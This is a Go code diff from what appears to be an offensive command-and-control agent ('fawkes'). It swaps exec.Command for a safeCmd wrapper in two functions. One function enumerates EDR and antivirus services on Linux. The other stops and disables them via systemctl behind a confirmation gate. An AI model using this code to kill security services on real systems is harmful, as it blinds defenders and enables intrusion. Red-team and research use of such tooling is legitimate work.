@@ -4,7 +4,6 @@ package commands
 
 import (
 	"fmt"
-	"os/exec"
 	"strings"
 
 	"fawkes/pkg/structs"
@@ -17,7 +16,7 @@ func serviceEdrEnumLinux() structs.CommandResult {
 
 	for _, entry := range candidates {
 		// Check if unit exists and get its status
-		out, err := exec.Command("systemctl", "is-active", entry.ServiceName).CombinedOutput()
+		out, err := safeCmd("systemctl", "is-active", entry.ServiceName).CombinedOutput()
 		status := strings.TrimSpace(string(out))
 
 		if err != nil && status == "" {
@@ -53,7 +52,7 @@ func serviceEdrEnumLinux() structs.CommandResult {
 // serviceEdrKillLinux attempts to stop and disable detected EDR/AV services via systemctl.
 func serviceEdrKillLinux(args serviceArgs) structs.CommandResult {
 	if strings.ToUpper(args.Confirm) != "EDR-KILL" {
-		return errorResult("Error: EDR-KILL requires -confirm EDR-KILL safety gate. This will attempt to stop and disable security services.")
+		return errorResult("EDR-KILL requires -confirm EDR-KILL safety gate. This will attempt to stop and disable security services.")
 	}
 
 	candidates := edrMatchesForPlatform("linux")
@@ -65,17 +64,17 @@ func serviceEdrKillLinux(args serviceArgs) structs.CommandResult {
 
 	for _, entry := range candidates {
 		// Check if active
-		out, _ := exec.Command("systemctl", "is-active", entry.ServiceName).CombinedOutput()
+		out, _ := safeCmd("systemctl", "is-active", entry.ServiceName).CombinedOutput()
 		status := strings.TrimSpace(string(out))
 		if status != "active" {
 			continue
 		}
 
 		// Stop the service
-		stopOut, stopErr := exec.Command("systemctl", "stop", entry.ServiceName).CombinedOutput()
+		stopOut, stopErr := safeCmd("systemctl", "stop", entry.ServiceName).CombinedOutput()
 
 		// Disable the service
-		disableOut, disableErr := exec.Command("systemctl", "disable", entry.ServiceName).CombinedOutput()
+		disableOut, disableErr := safeCmd("systemctl", "disable", entry.ServiceName).CombinedOutput()
 
 		if stopErr != nil {
 			sb.WriteString(fmt.Sprintf("  [!] %s (%s): STOP FAILED — %s\n", entry.ServiceName, entry.Product, strings.TrimSpace(string(stopOut))))
